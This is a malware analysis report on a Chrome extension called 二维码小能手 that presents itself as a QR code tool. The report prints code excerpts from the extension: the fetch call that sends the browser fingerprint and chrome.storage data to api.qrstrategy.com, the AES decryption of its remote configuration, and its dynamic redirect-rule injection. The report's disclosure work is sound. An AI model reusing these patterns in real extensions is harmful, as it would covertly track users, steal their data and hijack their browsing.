# Vulnerability Report: 二维码小能手

## Metadata
- **Extension ID**: inkoacoebhbbfcidbbjognchggilmefm
- **Extension Name**: 二维码小能手 (QR Code Helper)
- **Version**: 0.0.6
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension masquerades as a simple QR code generator but implements a sophisticated data exfiltration and affiliate injection scheme. The extension collects browser fingerprints using FingerprintJS and exfiltrates chrome.storage.sync data to `api.qrstrategy.com`. It then receives AES-encrypted remote configuration that dynamically injects URL redirect rules using the declarativeNetRequest API to hijack user navigation for affiliate profit. The extension's actual functionality goes far beyond generating QR codes, making this a clear case of undisclosed malicious behavior.

The combination of hidden data exfiltration, remote code configuration, and dynamic redirect injection without user disclosure represents a critical security and privacy violation.

## Vulnerability Details

### 1. CRITICAL: Browser Fingerprint Exfiltration
**Severity**: CRITICAL
**Files**: js/contentscript.js, serviceworker.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**:
The extension uses FingerprintJS (v3.3.2) embedded in the content script to generate a unique browser fingerprint from the user's system. This fingerprint includes highly identifying information such as:
- navigator.platform, navigator.oscpu, navigator.cpuClass
- Device memory, hardware concurrency
- Screen resolution, color depth
- Timezone, language settings
- Installed plugins and fonts
- Canvas fingerprinting

The fingerprint is generated on every page load (`matches: ["*://*/*"]`) and sent to the service worker, which then exfiltrates it to `api.qrstrategy.com/sr105/qrinfo`.

**Evidence**:
```javascript
// js/contentscript.js:1227-1240
(async () => {
  const e = await ie,
    t = await e.get(),
    { visitorId: n } = await t;
  return n
})().then((e => {
  chrome.runtime.sendMessage({
    event: "setFingerprint",
    body: { id: e }
  })
}))

// serviceworker.js:2227-2236
const i = await fetch(`${n}/sr105/qrinfo`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: h(JSON.stringify({
    bf: t,
    version: c(),
    fg: r  // fingerprint
  }))
})
```

**Verdict**: This is undisclosed tracking and profiling across all websites the user visits. The extension has no legitimate need for browser fingerprinting in a QR code tool.

### 2. CRITICAL: Chrome Storage Data Exfiltration
**Severity**: CRITICAL
**Files**: serviceworker.js
**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**Description**:
The service worker exfiltrates the entire chrome.storage.sync data (variable `bf`) along with the browser fingerprint to the remote server at `api.qrstrategy.com`. This could include sensitive data stored by other extensions or the user's sync data.

**Evidence**:
```javascript
// serviceworker.js:2232-2236
body: h(JSON.stringify({
  bf: t,           // chrome.storage data
  version: c(),
  fg: r           // fingerprint
}))
```

The `bf` variable is passed throughout the code and represents browser/storage data being sent to the remote server.

**Verdict**: Exfiltrating chrome.storage data is a severe privacy violation. Users have no indication this data collection is occurring.

### 3. HIGH: Remote Configuration with Dynamic Redirect Injection
**Severity**: HIGH
**Files**: serviceworker.js
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**:
After exfiltrating user data, the extension receives an AES-encrypted configuration from the server. This configuration is decrypted locally and contains rules for injecting URL redirects using the declarativeNetRequest API. The extension dynamically writes these redirect rules to hijack user navigation.

**Evidence**:
```javascript
// serviceworker.js:2238-2249
const s = await i.json();
if (1 === s.success) {
  const t = ((t, r = e) => a().AES.decrypt(t, a().enc.Utf8.parse(r), {
    iv: a().enc.Utf8.parse(r),
    mode: a().mode.CBC,
    padding: a().pad.Pkcs7
  }).toString(a().enc.Utf8))(s.data);
  return !!t && JSON.parse(t)
}
// ...
l.jsonData = i, new f(l.jsonData, l.fingerprint, t).init()
```

The `f` class implements redirect rule injection:
```javascript
// serviceworker.js:2137-2170
writeRules(t, e, r, i, n, s) {
  i ? chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: t,
      priority: e,
      condition: {
        regexFilter: r,
        resourceTypes: ["main_frame"]
      },
      action: {
        type: "redirect",
        redirect: { url: i }  // Direct URL redirect
      }
    }]
  }) : chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: t,
      priority: e,
      condition: {
        regexFilter: r,
        resourceTypes: ["main_frame"]
      },
      action: {
        type: "redirect",
        redirect: {
          transform: {
            queryTransform: {
              addOrReplaceParams: n  // Query param injection
            }
          }
        }
      }
    }]
  })
}
```

**Verdict**: The extension can inject arbitrary redirect rules based on remote commands, enabling affiliate injection, traffic hijacking, or redirecting users to malicious sites. The use of encryption obscures the malicious payload from detection.

## False Positives Analysis

- **CryptoJS (AES encryption)**: Not a false positive. While AES encryption is legitimate technology, it's being used here to obscure malicious configuration from detection.
- **Webpack bundling**: The code is webpack-bundled but not obfuscated in the traditional sense. However, the static analyzer flagged it as obfuscated due to complexity.
- **FingerprintJS library**: While FingerprintJS is a legitimate library, its use in this context (without disclosure, on all pages) for tracking purposes is malicious.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| api.qrstrategy.com/sr105/qrinfo | Remote C&C server | Browser fingerprint, chrome.storage data, extension version | CRITICAL - Data exfiltration and remote config retrieval |
| openfpcdn.io/fingerprintjs/v3.3.2/npm-monitoring | FingerprintJS telemetry | Basic usage stats | LOW - Standard library telemetry (1% sample rate) |

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:
This extension exhibits multiple characteristics of malware:

1. **Hidden Data Exfiltration**: Collects browser fingerprints and chrome.storage data on every page across all websites without user knowledge or consent
2. **Remote Command & Control**: Receives encrypted configuration from a remote server to determine its malicious behavior
3. **Dynamic Redirect Injection**: Modifies user navigation through declarativeNetRequest rules based on remote commands
4. **Deceptive Functionality**: Advertises as a simple "QR code helper" but implements sophisticated tracking and traffic manipulation

The extension's use of encryption to hide its remote configuration, combined with broad permissions (`*://*/*`, `declarativeNetRequest`), persistent fingerprinting, and data exfiltration makes this a textbook case of malicious browser extension behavior. Users installing this extension for QR code generation are unknowingly installing tracking malware with affiliate injection capabilities.

**Recommendation**: Immediate removal from Chrome Web Store and user notification to uninstall.
